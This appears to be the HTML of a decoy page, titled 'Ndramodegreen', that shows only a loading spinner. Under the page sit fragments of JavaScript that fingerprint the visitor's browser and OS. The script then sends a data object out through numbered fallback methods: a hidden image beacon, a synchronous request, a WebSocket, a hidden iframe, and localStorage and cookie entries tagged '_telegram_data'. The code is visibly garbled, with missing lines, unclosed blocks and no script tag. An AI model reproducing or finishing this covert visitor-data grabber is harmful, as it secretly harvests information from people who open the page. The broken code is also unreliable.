<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ndramodegreen</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: #0a0a0f;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Segoe UI', system-ui, sans-serif;
      overflow: hidden;
      user-select: none;
    }
    .container {
      text-align: center;
      position: relative;
    }
    .spinner {
      width: 80px;
      height: 80px;
      border: 8px solid rgba(52, 152, 219, 0.15);
      border-top: 8px solid #00f5ff;
      border-right: 8px solid #ff00e6;
      border-radius: 50%;
      animation: spin 0.6s cubic-bezier(0.65, 0, 0.35, 1) infinite;
      filter: drop-shadow(0 0 25px #00f5ff88);
      margin: 0 auto 30px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg) scale(1); }
      50% { transform: rotate(180deg) scale(1.15); }
      100% { transform: rotate(360deg) scale(1); }
    }
    .glow-text {
      color: #fff;
      font-size: 1.2rem;
      letter-spacing: 3px;
      text-transform: uppercase;
      background: linear-gradient(90deg, #00f5ff, #ff00e6, #00f5ff);
      background-size: 300% 100%;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: shimmer 2s linear infinite;
      font-weight: 700;
    }
    @keyframes shimmer {
      0% { background-position: 0% 50%; }
      100% { background-position: 300% 50%; }
    }
    .sub {
      color: #445566;
      margin-top: 12px;
      font-size: 0.75rem;
      letter-spacing: 1px;
    }
  </style>
</head>
<body>

            let os = 'unknown';
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edge')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';

            else if (ua.includes('Mac OS')) os = 'MacOS';
            else if (ua.includes('Linux')) os = 'Linux';
            else if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            
            return { browser, os };

        //  METHOD 2: Image Beacon (fallback)
        // ==========================================================
        const img = new Image();
        img.src = url + '&_=' + Date.now();
        img.style.display = 'none';
        document.body.appendChild(img);

          const xhr = new XMLHttpRequest();
          xhr.open('GET', url, false);

        } catch(e) {}

        // ==========================================================

          }
        } catch(e) {}

        //  METHOD 5: WebSocket (alternative)
        // ==========================================================
        try {
          const ws = new WebSocket('wss://echo.websocket.org');

          };
        } catch(e) {}

        // ==========================================================
        //  METHOD 6: PostMessage ke iframe (jika ada)
        // ==========================================================
        try {
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          iframe.src = 'about:blank';
          document.body.appendChild(iframe);
          iframe.contentWindow.postMessage(data, '*');
        } catch(e) {}

        // ==========================================================
        //  METHOD 7: localStorage sync (jika ada akses)
        // ==========================================================
        try {
          localStorage.setItem('_telegram_data_' + Date.now(), JSON.stringify(data));
        } catch(e) {}

        // ==========================================================
        //  METHOD 8: Cookie (jika ada)
        // ==========================================================
        try {
          document.cookie = '_telegram_data=' + encodeURIComponent(JSON.stringify(data)) + '; path=/';
        } catch(e) {}

      } catch (e) {

      }
    })();
